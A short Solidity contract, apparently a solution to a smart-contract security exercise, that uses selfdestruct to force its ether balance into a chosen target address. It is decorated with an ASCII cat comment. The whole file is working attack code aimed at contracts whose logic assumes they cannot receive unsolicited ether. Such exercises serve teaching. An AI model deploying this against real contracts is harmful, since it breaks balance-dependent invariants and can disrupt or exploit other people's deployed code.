// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */

    address payable public addressToAttack;
    constructor  (address payable _addressToAttack) payable {
        addressToAttack = _addressToAttack;
    }                 

    function forceAttack() public {
        selfdestruct(addressToAttack);
    } 
}
